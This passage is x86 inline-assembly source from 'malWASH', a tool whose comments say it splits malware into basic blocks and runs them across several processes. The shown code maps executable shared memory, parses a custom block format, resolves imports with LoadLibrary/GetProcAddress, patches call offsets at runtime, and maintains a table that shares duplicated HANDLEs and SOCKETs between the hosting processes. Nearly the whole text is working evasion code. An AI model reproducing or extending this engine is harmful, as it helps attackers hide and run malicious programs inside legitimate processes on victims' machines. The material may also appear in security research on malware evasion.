			mov		dword ptr [esp + 0x8], 0x40			// flProtect: PAGE_READWRITE | PAGE_EXECUTE_READWRITE
														//
		attachreg_non_exec:								//
			mov		dword ptr [esp + 0x4], 0			// lpAttributes: NULL
			mov		dword ptr [esp], 0xffffffff			// hFile: INVALID_HANDLE_VALUE
			call	[CreateFileMappingA]				// CreateFileMappingA() 
														// Note that we can use OpenFileMapping instead
			pop edx										// restore arg2
			test	eax, eax							// NULL returned?
			je		attachreg_error						// if so, jump to error
			push	eax									// save handle
														//
			push	[esp + 0x10]						// lpBaseAddress: arg3 
			push	edx									// dwNumberOfBytesToMap: arg2
			push	0									// dwFileOffsetLow: 0
			push	0									// dwFileOffsetHigh: 0
			push	0xf001f								// dwDesiredAccess: FILE_MAP_ALL_ACCESS
			// --------------------------------------------------------------------------
			// in case of const_detour() copy, region must be +X
			// --------------------------------------------------------------------------
			cmp		dword ptr[esp + 0x10 + 0x14], DUPDETOURADDR	// lpBaseAddress == DUPDETOURADDR?
			jnz		attachreg_non_exec2					//
														//
			or		dword ptr [esp], 0x20				// flProtect: FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE
														//
		attachreg_non_exec2:							//			
			push	eax									// hFileMappingObject: hMapFile
			call	[MapViewOfFileEx]					// MapViewOfFileEx()
			pop		edx									// edx has the handle pushed before
			test	eax, eax							// NULL returned?
			jz		attachreg_closenerror				// if so, jump to error
			jmp		attachreg_success					// skip error handling
			// --------------------------------------------------------------------------
			// here's code for error handling
			// --------------------------------------------------------------------------
		attachreg_closenerror:
			push	edx									// shared mem handle on stack 
			call	[CloseHandle]						// CloseHandle()	
		attachreg_error:								//
			mov		eax, 0xffffffff						// return an error
		attachreg_success:								//
			pop		edi									// restore registers
			pop		esi									//
			// add		esp, 0x8						// release stack space
			retn	4									// no function epilog (clear arg3 from stack)
	}
	//-------------------------------------------------------------------------------------------------------
	// block_prolog(): This function is doing all required modifiction to basic block, to make it ready for
	// execution. Each block has the following structure which contains several metadata:
	//
	//		Bit
	//		0              7               15              23              31
	//		+--------------+---------------+---------------+---------------+
	//		|                     "WASH" (File Header)                     |
	//		+--------------+---------------+---------------+---------------+
	//		|           Block ID           |                               |
	//		+--------------+---------------+                               |
	//		|           NULL Terminating List of Target Block IDs          |
	//		+--------------+---------------+---------------+---------------+
	//		|                 "BBLK" (Basic Block Header)                  |
	//		+--------------+---------------+---------------+---------------+
	//		|       Basic Block Size       |                               |
	//		+--------------+---------------+                               |
	//		|                                                              |
	//		|             The actual opcodes of the basic block            |
	//		|                                                              |
	//		+--------------+---------------+---------------+---------------+
	//		|              "SEGM" (Segment Relocation Header)              |
	//		+--------------+---------------+---------------+---------------+
	//		|     Relocation Offset #1     |    Segment Table Offset #1    |
	//		|            .....             |             .....             |
	//		|     Relocation Offset #N     |    Segment Table Offset #N    |
	//		+--------------+---------------+---------------+---------------+
	//		|             "FUNC" (Function Relocation Header)              |
	//		+--------------+---------------+---------------+---------------+
	//		|     Relocation Offset #1     |    Function Table Offset #1   |
	//		|            .....             |             .....             |
	//		|     Relocation Offset #N     |    Function Table Offset #N   |
	//		+--------------+---------------+---------------+---------------+
	//		|          "DUPL" (SOCKET/HANDE Duplication Header)            |
	//		+--------------+---------------+---------------+---------------+
	//		|    Duplication Offset #1     |Duplicated argument #1 location|
	//		|            .....             |             .....             |
	//		|    Duplication Offset #N     |Duplicated argument #N location|
	//		+--------------+---------------+---------------+---------------+	
	//		|              "HEAP" (Heap Manipulation Header)               |
	//		+--------------+---------------+---------------+---------------+
	//		|     Relocation Offset #1     |        Heap Operation         |
	//		|            .....             |             .....             |
	//		|     Relocation Offset #N     |        Heap Operation         |
	//		+--------------+---------------+---------------+---------------+
	//		|                 "ENDW" (File End Signature)                  |
	//		+--------------+---------------+---------------+---------------+
	//
	//	As you can see there are many things that we have to fix before we make a block ready for execution
	//  we have to parse all of its metadata and fix all runtime issues (relocations, etc.).
	//
	// Arguments: (fastcall) ecx (void*) : a pointer to a basic block
	//
	// Return Value: If function succeeds, the return value is the offset withing the block that the actual
	//	code starts. Otherwise it returns an error code.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		block_prolog:									// do not modify ebp!
			// --------------------------------------------------------------------------
			// now do the block relocations
			// --------------------------------------------------------------------------
			lea		ebx, dword ptr [ecx]				// read blk signature (ecx = &blk)
			mov		edi, ERROR_WASH_SIG_INVALID			// set possible error code
			cmp		dword ptr [ebx], 0x48534157			// signature == "WASH"
			jne		block_prolog_error					// if not, block format is wrong
			// --------------------------------------------------------------------------
			// skip edge list, set ebx to block opcodes, and edx to segment list
			// --------------------------------------------------------------------------
			add		ebx, 6								// after 6 bytes, edge list begins
		edge_loop:										//
			mov		ax,word ptr [ebx]					// read a word from this address
			inc		ebx									//
			inc		ebx									// get next edge
			test	ax, ax								// NULL in edge list found?
			jne		edge_loop							// if not, get next target from edge list	
														//
			mov		edi, ERROR_BLK_SIG_INVALID			// set possible error code
			cmp		dword ptr [ebx], 0x4b4c4242			// signature == "BBLK"
			jne		block_prolog_error					// if not, block format is wrong
														//
			add		ebx, 6								// skip BBLK header and block size
			movzx	edx, word ptr[ebx - 2]				// edx has the block length
			add		edx, ebx							// edx points to segment list
														//
			mov		edi, ERROR_BLK_SEGM_SIG_INVALID		// set possible error code
			cmp		dword ptr [edx], 0x4d474553			// signature == "SEGM"
			jne		block_prolog_error					// if not, block format is wrong
			// --------------------------------------------------------------------------
			// ebx, contains the value that has to be returned
			// --------------------------------------------------------------------------
			push	ebx									// store ebx
			call	get_noebp_local_storage_esi			// locate local storage
			lea		eax, ds:[esi + noebp_blk_prolog_baseaddr]
			mov		[eax], ebx							// store base address
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifndef __VAR_1_PRELOAD_BLOCKS__
			// --------------------------------------------------------------------------
			// copy block from shared region to blk_entry_point
			// blocks are copied from heap, which is not +X, or
			// are copied from shared region, where we don't want to make any changes to them
			// --------------------------------------------------------------------------
			movzx	ecx, word ptr[ebx - 2]				// ecx = actual block size
			lea		esi, [ebx]							// esi = actual block opcodes
			call	find_blk_entry_point				// find block entry point
			mov		edi, eax							// edi = &blk_entry_point
			cld											// clear DF (++ mode)
			rep		movsb								// copy block
			// --------------------------------------------------------------------------
			// fill the gap between unused block bytes and exec epilog (context switch)
			// we have 2 options:
			//	[1]. Fill the rest of the block with NOP
			//	[2]. Append at the bottom an instruction jmp +(MAXBLKSIZE - ebx - 5) to
			//		 skip the rest of the block (+5 because jmp 0x11223344 is 5 bytes long)
			//
			// We can use both methods here, it's fine.
			//
			// NOTE: I don't think that 1st method will have any performance impact :))
			// --------------------------------------------------------------------------
			// method [2] (Note that we can also do this in splitting step)
			// --------------------------------------------------------------------------
			mov		ecx, MAXBLKSIZE						// first 3 instructions are common in both methods
			movzx	eax, word ptr[ebx - 2]				// 
			sub		ecx, eax							// 
			sub		ecx, 5								// jmp +0x176 = e9 76 01 00 00 -> 5 bytes long
			mov		byte ptr[edi], 0xe9					// set up opcode
			inc		edi									// move pointer
			mov		dword ptr[edi], ecx					// write offset
			add		edi, 4								// adjust edi (for method 1 later)
			// --------------------------------------------------------------------------
			// method [1]
			// --------------------------------------------------------------------------
			mov		ecx, MAXBLKSIZE						// get maximum block size
			movzx	eax, word ptr[ebx - 2]				// ecx = actual block size
			sub		ecx, eax							// find the block size left
														//
			sub		ecx, 6								// use this ONLY if you used method 2 before
			mov		eax, 0xff							// NOP opcode = 0x90
			cld											// clear direction flag -> increment edi
			rep		stosb								// fill the rest with nops
														//
			call	get_noebp_local_storage_esi			// locate local storage
			lea		eax, [esi + noebp_blk_prolog_baseaddr]
			push	eax									// backup eax
			call	find_blk_entry_point				// find block entry point
			mov		ebx, eax							// set blk_entry_point as base address
			pop		eax									// restore eax
			mov		[eax], ebx							//
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
			// --------------------------------------------------------------------------
			// do the segment relocations
			// --------------------------------------------------------------------------
			add		edx, 4								// edx points back to the beginning of segment list
		segmrel_loop:									//
			cmp		dword ptr [edx], 0x434e5546			// FUNC signature found?
			je		segmrel_loop_end					// if not get next segment in list		
														//
			movzx	eax, word ptr[edx]					// eax has the offset within the block
			movzx	ebx, word ptr[edx + 2]				// ebx has the segment id
			shl		ebx, 4								// ebx = sizeof(segm_t) = 16
														//
			mov		edi, dword ptr[loctrl]				// get shared control region
			mov		edi, dword ptr[edi+ebx + SEGMOFFSTR]// edi = loctrl->segm[i].startEA
														//
			call	get_noebp_local_storage_esi			// locate local storage
			lea		esi, ds:[esi + noebp_blk_prolog_baseaddr]
			mov		esi, [esi]							//
			lea		eax, [esi + eax]					// locate address within block
			sub		[eax], edi							// get the absolute offset within block
			shr		ebx, 4								// rewind ebx
														// now add the virtual base address of shared segment 
			lea		esi, dword ptr[segmptr]				// get segment table
			lea		ebx, [esi + ebx*8]					// ebx = segmptr[i]
			mov		ebx, dword ptr [ebx + 0]			// ebx = segmptr[i].base
			add		[eax], ebx							// now we can access the shared segment instead 
														//
			add		edx, 4								// get next item in list
			jmp		segmrel_loop						// go back
			// ------------------------------------------------------------------------------------
			// do the function relocations
			//
			// For relative near calls, we have to change block so we don't have to worry about them now.
			// However for imported funtions, that are in the form: call [some_addr], we have 2 options:
			//	[1]. We allocate a function table with function pointers, and we patch some_addr with the
			//		 address of the table. Limitation: Static size of fptable.
			//
			//	[2]. We change call to a relative flavor. Thus call [0x11223344] (ff 15 44 33 22 11) will be
			//		 call 0x11223344 (e8 40 33 22 11). The 2nd instruction has 1 byte less, but we can fix
			//		 it by adding a nop before the call. Thus we'll have a relative offset from imported 
			//		 function.
			//		 Note that this method won't work under instructions like this:  jmp ds:__imp__memset.
			//		 However, it's easy to modify method 2 to handle such cases.
			// ------------------------------------------------------------------------------------
		segmrel_loop_end:								//
			add		edx, 4								// edx points back to the beginning of function list
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_2_USE_FUNCTION_POINTER_TABLE__
			lea		ecx, [fptab]						// address of function pointer table (for method 2)
			add		ecx, [fptabcnt]						// get counter
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
		funcrel_loop:									//
			cmp		dword ptr [edx], 0x4c505544			// DUPL signature found?
			jz		funcrel_loop_end					// if not get next segment in list		
														//
			movzx	eax, word ptr[edx]					// eax has the offset within the block
			movzx	ebx, word ptr[edx + 2]				// ebx has the offset within function table
														//
			mov		esi, [loctrl]						//
			lea		esi, [esi + ebx + FUNTABOFF]		// esi = loctrl->funtab[ebx]
														//
			push	eax									// backup eax
			call	get_noebp_local_storage_eax			// locate local storage
			lea		edi, ds:[eax + noebp_blk_prolog_baseaddr]
			pop		eax									// restore eax
			mov		edi, [edi]							// read base address
			lea		edi, [edi + eax]					// edi = address to patch
														//
			call	second_order_hooks					// check for second order hooks
			test	esi, esi							// if function returns 0, thread function found
			je		funcrel_loop_skip					// skip the rest
														//
			push	edx									// LoadLibrary and GetProcAddress will modify
			push	ecx									// ecx and edx. Backup them
			// --------------------------------------------------------------------------
			// find imported module
			// --------------------------------------------------------------------------
			movzx	ecx, word ptr[esi - 2]				// ecx contains module ID (it's 2 bytes before name)
			shl		ecx, 6								// each entry is MAXMODNAMELEN=64 bytes
														//
			mov		edx, [loctrl]						//
			lea		eax, [edx + ecx + MODLOFF]			// locate address of module name
			push	eax									// arg1: module name
			call	[LoadLibraryA]						// Load module to memory
														//
			push	edi									// edi is already used
			mov		edi, ERROR_LOADLIB_FAILED			// set possible error code
			test	eax, eax							// NULL returned?
			je		block_prolog_popnerror_3			// if so, go to error handling 
														// (edi is pushed but we don't care)
			pop		edi									// restore it
														//
			// NOTE: If the dll is already loaded, LoadLibrary will increase the reference count to that library
			push	esi									// arg2: function name
			push	eax									// arg1: module handle
			call	[GetProcAddress]					// Find function address
														//
			push	edi									// edi is already used
			mov		edi, ERROR_PROCADDR_NOT_FOUND		// set possible error code
			test	eax, eax							// NULL returned?
			je		block_prolog_popnerror_4			// if so, go to error handling 
			pop		edi									// restore it
														//
			pop		ecx									// restore ecx and edx
			pop		edx									//
		funcrel_loop_skip:								//
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_2_USE_FUNCTION_POINTER_TABLE__
			// --------------------------------------------------------------------------
			// method [1]
			// --------------------------------------------------------------------------
			cmp		byte ptr[edi - 1], 0xa1				// do we have a mov eax, __imp__addr? (0xa1)
			jne		funcrel_direct						// if not use function's fptab entry address
			mov		ecx, eax							// otherwise, use the direct function address
														//
		funcrel_direct:									//
			mov		[ecx], eax							// store address in fptab
			mov		[edi], ecx							// patch with address of fptab
		    add		ecx, 4								// get next function relocation
			add		[fptabcnt],4						// fptabcnt += 4
#else 
			// --------------------------------------------------------------------------
			// method [2]
			// --------------------------------------------------------------------------
			lea		ecx, [edi + 4]						// get local offset
			sub		eax, ecx							// function_address - local offset
			mov		[edi], eax							// call needs a relative offset	
			mov		[edi - 2], 0x90						// NOP
			mov		[edi - 1], 0xe8						// indirect call 1st opcode
#endif													//
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
			add		edx, 4								// get next item in list
			jmp		funcrel_loop						// go back
			// ------------------------------------------------------------------------------------
			// create trampoline functions for handling duplicated SOCKETs/HANDLEs
			// ------------------------------------------------------------------------------------
		funcrel_loop_end:								//
			add		edx, 4								// edx points back to the beginning of dupl list
														//
		duptramp_loop:									//
			cmp		dword ptr [edx], 0x50414548			// HEAP signature found?
			jz		duptramp_loop_end					// if not get next segment in list		
														//
			movzx	eax, word ptr[edx]					// eax has the offset within the block of the dup_??()
			mov		bl, byte ptr[edx + 2]				// ebx has the argument location (0 for return value)
			mov		cl, byte ptr[edx + 3]				// ecx has the type (see malwash splitter for details)
														//
			push 	eax									// backup eax
			call	find_blk_entry_point				// find block entry point
			mov		edi, eax							// edi = original block entry point
			pop		eax									// restore eax
														//
			lea		esi, [eax + edi]					// esi = address to patch
			push	eax									// backup eax
			// --------------------------------------------------------------------------
			// check duplication type
			// --------------------------------------------------------------------------
			cmp		cl, DUPHANDLE						// duplicate handle?
			je		duptramp_handle						//
			cmp		cl, DUPHANDLE2						// duplicate 2 handles?
			je		duptramp_handle2					//
			cmp		cl, DUPSOCK							// duplicate socket?
			je		duptramp_sock						//
			cmp		cl, DUPSOCK2						// duplicate 2 sockets?
			je		duptramp_sock2						//
			cmp		cl, CLOSEHANDLE						// close duplicated handle?
			je		duptramp_close_handle				//
			cmp		cl, CLOSESOCK						// close duplicate socket?
			je		duptramp_close_sock					//
			cmp		cl, DUPPTRHANDLE					// pointer handle?
			je		duptramp_ptrhandle					//
			cmp		cl, DUPPTRHANDLE_2					// double pointer handle?
			je		duptramp_ptrhandle2					//
														//
			mov		edi, ERROR_DUP_TYPE_INVALID			// set error code
			pop		eax									// restore offset pushed from ebx
			jmp		block_prolog_popnerror				// go to error handling 
			// --------------------------------------------------------------------------
			// duplicate HANDLE
			// --------------------------------------------------------------------------
		duptramp_handle2:								//
			call	get_locduphdl2_addr					// find runtime address of locduphdl2
			sub		esi, eax							// relative address (don't use labels)
			jmp		duptramp_switch_end					//
														//
		duptramp_ptrhandle2:							//
			call	get_crtduphandle2_addr				// find runtime address of crtduphandle2
			sub		esi, eax							// relative address (don't use labels)
			jmp		duptramp_switch_end					//
														//
		duptramp_ptrhandle:								//
			test	bl, 0x7f							//
			jnz		duptramp_loc_ptrduphdl				//
														//
			call	get_crtduphandle_addr				// find runtime address of crtduphandle
			sub		esi, eax							// relative address (don't use labels)
			jmp		duptramp_switch_end					//
														//
		duptramp_handle:								//
			test	bl, bl								// HANDLE is return value or argument?
			jnz		duptramp_loc_duphdl					// it's a return value
														//
			call	get_crtduphandle_addr				// find runtime address of crtduphandle
			sub		esi, eax							// relative address (don't use labels)
			jmp		duptramp_switch_end					//
														//
		duptramp_loc_duphdl:							// otherwise, it's an argument
			test	bl, 0x80							// is MSBit set? (both return value and argument?)
			jz		duptramp_loc_only					// if not just duplicate handle
			nop											// otherwise duplicate both (arg + ret)
			and		bl, 0x7f							// clear MSBit
			// --------------------------------------------------------------------------
			// in such cases we have to patch 2 functions. Patch the 2nd here and the 1st 
			// at duptramp_switch_end 
			// --------------------------------------------------------------------------			
			push	esi									// backup address to patch
														//
			call	get_locduphdl_addr					// find runtime address of locduphdl
			sub		esi, eax							// 
			mov  	eax, [esp + 4]						// restore eax without removing it
			add		esi, 4								// +4 becasue eip points to the next instruction
			sub		esi, 0x13							// subtract the 19 byte offset from previous patch
			neg		esi									// get negative number because functions are above
														// block's entry point
			push	eax									// backup eax
			call	get_noebp_local_storage_eax			// locate local storage
			lea		edi, ds:[eax + noebp_blk_prolog_baseaddr]
			pop		eax									// restore eax
			mov		edi, [edi]							// edi = block entry point in heap
			mov		[eax + edi - 0x13], esi				// patch!		
														//
			pop		esi									// restore esi to patch the 1st address
														//
			call	get_crtduphandle_addr				// find runtime address of crtduphandle
			sub		esi, eax							// relative address of crtduphandle
			jmp		duptramp_switch_end					//
														//
		duptramp_loc_ptrduphdl:							//
			// --------------------------------------------------------------------------
			// in this case we also have to patch 2 functions. However the offset between
			// these functions is different (21 bytes and not 15)
			// --------------------------------------------------------------------------			
			push	esi									// backup address to patch
														//
			call	get_locduphdl_addr					// find runtime address of locduphdl
			sub		esi, eax							// 
			mov  	eax, [esp + 4]						// restore eax without removing it
			add		esi, 4								// +4 becasue eip points to the next instruction
			sub		esi, 0x1c							// subtract the 24 byte offset from previous patch
			neg		esi									// get negative number because functions are above
														// block's entry point
			push	eax									// backup eax
			call	get_noebp_local_storage_eax			// locate local storage
			lea		edi, ds:[eax + noebp_blk_prolog_baseaddr]
			pop		eax									// restore eax
			mov		edi, [edi]							// edi = block entry point in heap
			mov		[eax + edi - 0x1c], esi				// patch!		
														//
			pop		esi									// restore esi to patch the 1st address
														//
			call	get_crtduphandle_addr				// find runtime address of crtduphandle
			sub		esi, eax							// relative address of crtduphandle
			jmp		duptramp_switch_end					//
			// --------------------------------------------------------------------------
			// duplicate SOCKET
			// --------------------------------------------------------------------------
		duptramp_sock2:									//
			call	get_locduphdl2_addr					// find runtime address of locduphdl2
			sub		esi, eax							// relative address (don't use labels)
			jmp		duptramp_switch_end					//
		duptramp_sock:									//
			test	bl, bl								// SOCKET is return value or argument?
			jnz		duptramp_loc_dupsock				// it's a return value
														//
			call	get_crtdupsock_addr					// find runtime address of crtdupsock
			sub		esi, eax							// relative address of crtdupsock
			jmp		duptramp_switch_end					// 
		duptramp_loc_dupsock:							// otherwise, it's an argument
			test	bl, 0x80							// is MSBit set? (both return value and argument?)
			jz		duptramp_loc_only					// if not just duplicate handle
			nop											// otherwise duplicate both (arg + ret)
			and		bl, 0x7f							// clear MSBit
			// --------------------------------------------------------------------------
			// in such cases we have to patch 2 functions. Patch the 2nd here and the 1st at duptramp_switch_end
			// code repetition is bad, but using unstructured jumps to fix this would be worse...
			// --------------------------------------------------------------------------			
			push	esi									// backup address to patch
														//
			call	get_locduphdl_addr					// find runtime address of locduphdl
			sub		esi, eax							// 
			mov  	eax, [esp + 4]						// restore eax without removing it
			add		esi, 4								// +4 becasue eip points to the next instruction
			sub		esi, 0x13							// subtract the 19 byte offset from previous patch
			neg		esi									// get negative number because functions are above/
														// block's entry point
			push	eax									// backup eax
			call	get_noebp_local_storage_eax			// locate local storage
			lea		edi, ds:[eax + noebp_blk_prolog_baseaddr]
			pop		eax									// restore eax
			mov		edi, [edi]							// edi = block entry point in heap
			mov		[eax + edi - 0x13], esi				// patch!		
														//
			pop		esi									// restore esi to patch the 1st address
														//
			call	get_crtdupsock_addr					// find runtime address of crtdupsock
			sub		esi, eax							// relative address of crtdupsock
			jmp		duptramp_switch_end					//
														//
		duptramp_loc_only:								//
			call	get_locduphdl_addr					// find runtime address of crtduphandle
														//
			sub		esi, eax							// relative address of locduphdl
			jmp		duptramp_switch_end					//
			// --------------------------------------------------------------------------
			// close a HANDLE or a SOCKET (ignore value of bl)
			// --------------------------------------------------------------------------
		duptramp_close_handle:							//
		duptramp_close_sock:							//
			call	get_closedupsock_addr				// find runtime address of closeduphandle
														//
			sub		esi, eax							// relative address of closedupsock
			jmp		duptramp_switch_end					// go to the end
			// --------------------------------------------------------------------------
			// now find the relative offset for the call:
			// call's offset is: -(current_address - target_address + 4)
			// --------------------------------------------------------------------------														
		duptramp_switch_end:							//
			pop		eax									// restore eax
			add		esi, 4								// +4 becasue eip points to the next instruction
			neg		esi									// get negative number because functions are above
														// block's entry point
			push	eax									// backup eax
			call	get_noebp_local_storage_eax			// locate local storage
			lea		edi, ds:[eax + noebp_blk_prolog_baseaddr]
			pop		eax									// restore eax
			mov		edi, [edi]							// edi = block entry point in heap
			mov		[eax + edi], esi					// patch!		
			add		edx, 4								// get next iteem in list
			jmp		duptramp_loop						// go back
		duptramp_loop_end:								//
														//
			add		edx, 4								// edx points back to the beginning of heap list
			// ------------------------------------------------------------------------------------
			// relocate heap functions
			// ------------------------------------------------------------------------------------
		heaptramp_loop:									//
			cmp		dword ptr [edx], 0x57444e45			// ENDW signature found?
			jz		heaptramp_loop_end					// if not get next segment in list		
														//
			movzx	eax, word ptr[edx]					// eax has the offset within the block of the heap_??()
			mov		bx, word ptr[edx + 2]				// bx has the heap operation
														//
			push 	eax									// backup eax
			call	find_blk_entry_point				// find block entry point
			mov		edi, eax							// edi = original block entry point
			pop		eax									// restore eax
														//
			lea		esi, [eax + edi]					// esi = address to patch
			push	eax									// backup eax
			// --------------------------------------------------------------------------
			// check heap operation type
			// --------------------------------------------------------------------------
			cmp		bx, HEAPOPALLOC						// alloc memory?
			je		heaptramp_alloc						//
			cmp		bx, HEAPOPFREE						// free memory?
			je		heaptramp_free						//
			cmp		bx, HEAPOPMMAP						// mmap?
			je		heaptramp_mmap						//
			cmp		bx, HEAPOPFREERWD					// free n rewind memory?
			je		heaptramp_freerwd					//
			// currently only alloc, free and mmap are supported
			mov		edi, ERROR_HEAP_OPERATION_INVALID	// set error code
			pop		eax									// restore offset pushed from ebx
			jmp		block_prolog_popnerror				// go to error handling 
			// --------------------------------------------------------------------------
			// allocate memory
			// --------------------------------------------------------------------------
		heaptramp_alloc:
			call	get_allocmem_addr					// find runtime address of allocmem	
			jmp		heaptramp_switch_end				// skip other operations
			// --------------------------------------------------------------------------
			// free memory
			// --------------------------------------------------------------------------
		heaptramp_free:
			call	get_freemem_addr					// find runtime address of freemem
			jmp		heaptramp_switch_end				// skip other operations
			// --------------------------------------------------------------------------
			// map a file to memory
			// --------------------------------------------------------------------------
		heaptramp_mmap:
			call	get_mapmem_addr						// find runtime address of mapmem
			jmp		heaptramp_switch_end				// skip other operations
			// --------------------------------------------------------------------------
			// free memory and rewind global heap pointer
			// --------------------------------------------------------------------------
		heaptramp_freerwd:
			call	get_freenrwdmem_addr				// find runtime address of freenrwdmem
			// --------------------------------------------------------------------------
			// now find the relative offset for the call:
			// call's offset is: -(current_address - target_address + 4)
			// --------------------------------------------------------------------------														
		heaptramp_switch_end:							//
			sub		esi, eax							// relative address (don't use labels)
			pop		eax									// restore eax
			add		esi, 4								// +4 becasue eip points to the next instruction
			neg		esi									// get negative number because functions are above
														// block's entry point
			push	eax									// backup eax
			call	get_noebp_local_storage_eax			// locate local storage
			lea		edi, ds:[eax + noebp_blk_prolog_baseaddr]
			pop		eax									// restore eax
			mov		edi, [edi]							// edi = block entry point in heap
			mov		[eax + edi], esi					// patch!		
			add		edx, 4								// get next iteem in list
			jmp		heaptramp_loop						// go back
		heaptramp_loop_end:								//
			pop		eax									// get the offset pushed on ebx before
			retn										// return
		block_prolog_popnerror_4:						//
			add		esp, 4								// remove 1 registers (total: 4)
		block_prolog_popnerror_3:						//
			add		esp, 8								// remove 2 registers (total: 3)
		block_prolog_popnerror:							//
			add		esp, 4								// remove offset
		block_prolog_error:								//
			mov		eax, edi							// set error code
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------


// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
// ++===================================================================================================++ //
// ||                     D U P L I C A T I O N   T A B L E   M A N I P U L A T I O N                   || //
// ++===================================================================================================++ //
//
// Duplication Table (aka duptab) is the mechanism that allow different malWASH instances (running in
// different processes) to share HANDLEs and SOCKETs. Duptab is a 2D table which maps the original 
// HANDLEs/SOCKETs with the duplicated ones. The idea is before original malware uses any SOCKET/HANDLE
// to lookup first in duptab and replace this SOCKET/HANDLE with the duplicated one. We provide functions
// for insert, delete and lookup values. During splitting process we insert hooks in the right places,
// and at runtime duptab functions being invoked through installed hooks. Current duptab can take up to 
// 8 entries. Each entry has the following structure:
//
//		Bit
//		0              7              15              23              31
//		+--------------+---------------+---------------+---------------+
//		|                 Original HANDLE/SOCKET value                 |
//		+--------------+---------------+---------------+---------------+
//		|          Value Type          |           Reserved            |
//		+--------------+---------------+---------------+---------------+
//		|           Duplicated SOCKET/HANDLE for process #1            |
//		|           Duplicated SOCKET/HANDLE for process #2            |
//		|                            .....                             |
//		|     Duplicated SOCKET/HANDLE for process #MAXCONCURNPROC     |
//		+--------------+---------------+---------------+---------------+
//
//
// WARNING: All these functions being called during execution of a malware block, e.g. during block 
// execution we transfer control to these functions, and then we return back to malware exeuction. This
// means that we have to leave all registers intact upon function exit. One thing that we may change is 
// FLAGS. EFL register may be changed upon exit. This doesn't cause any problems however. But it's not
// totally correct though. Someone could fix this (just add a pushfd on prolog and popfd on epilog; watch
// out stack alignment).
//
// We could have problems if a duptab function immediatelly followed by e.g. a conditional jump. Although
// not impossible this is a very rare scenario.
//
// ++===================================================================================================++ //
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //

	//-------------------------------------------------------------------------------------------------------
	// duptab_intsearch(): This function performs an internal search in duptab. It looks for a specific 
	//		"origval". Some entries may be used, while some others may be empty. In other words, we have to
	//		search every time the whole table; there's no upper bound on it.
	//
	// NOTE: This function is called from inside the basic block. Thus ebp won't point to our local 
	//		 variables and thus it's hard to write C (however it's possible to recover ebp from ebp_backup)
	//
	// Arguments: eax (void*) : SOCKET/HANDLE value
	//
	// Return Value: Function returns the corresponding index if value found or -1 if value not found.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		duptab_intsearch:								//
			push	esi									// backup registers that you're going to use
			push	ecx									//
			push	ebx									//
														//
			call	loctrl_backup_rd					// esi = loctrl from local storage
			add		esi, DUPTABOFF						// esi = loctrl->duptab
			mov		ecx, MAXOPENHANDLE					// go to the end of the table
			// --------------------------------------------------------------------------
			// iterate over duptab for the requested value
			// --------------------------------------------------------------------------
		duptab_loop:									//
			imul	ebx, ecx, DUPTABENTSZ 				// locate duptab_t entry
			mov		ebx, [esi + ebx - DUPTABENTSZ]		// ebx = loctrl->duptab[ecx - 1].origval
			cmp		ebx, eax							// ebx == requested value?
			je		duptab_idx_found					// value found?
			loop	duptab_loop							// move to the previous entry
														//
			mov		eax, 0xffffffff						// value not found
		duptab_idx_found:								//
			dec		ecx									// ecx points to the next value
			mov		eax, ecx							// set return value
														//
			pop		ebx									// restore registers
			pop		ecx									//
			pop		esi									//
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------
	// locduphdl(): Locate a duplicated socket/handle. This function searches in duptab to find the 
	//		"duplicated" version of a requested socket. When a process opens a socket/handle, it must be 
	//		duplicated by any other process wants to use it. However, once we duplicate a handle/socket, the 
	//		actual value will be different. This function gets the original value (the one that returned to
	//		process that created it), and replaces it with the duplicated one.
	//		This function is also called within basic block.
	//
	// Arguments: eax (void*) : original SOCKET/HANDLE value
	//
	// Return Value: Function returns the correct duplicated value of the SOCKET/HANDLE. If that value does
	//	not found, function returns -1.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_locduphdl_addr:								//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// locduphdl() function prolog
			// --------------------------------------------------------------------------
		locduphdl:										//
			pushfd										// backup flags
			test	eax, 0x80000000						// if MSBit is set, then it's not a real handle
			jz		locduphdl_realhandle				// e.g. maybe it's an Registry Key constant
			popfd										// restore flags
			retn										// simply return
														//
		locduphdl_realhandle:							//
			push	esi									// backup registers that you're going to use
			push	ebx									//
			push	edx									//
														//
			call	duptab_intsearch					// get duptab entry
			cmp		eax, 0xffffffff						// error ?
			jz		locduphdl_cleanup					// if not go on
														//
			call	loctrl_backup_rd					// esi = loctrl from local storage
			add		esi, DUPTABOFF						// esi = loctrl->duptab
			imul	ebx, eax, DUPTABENTSZ				// find duptab index 
														//	
			call	get_noebp_local_storage_eax			// get local storage	
			lea		edx, ds:[eax + noebp_pididx]		// no ebp!
			mov		edx, [edx]							// get index that corresponds to your pid
			lea		ebx, [ebx + 8 + edx*4]				// +8 to skip origval + reserved3
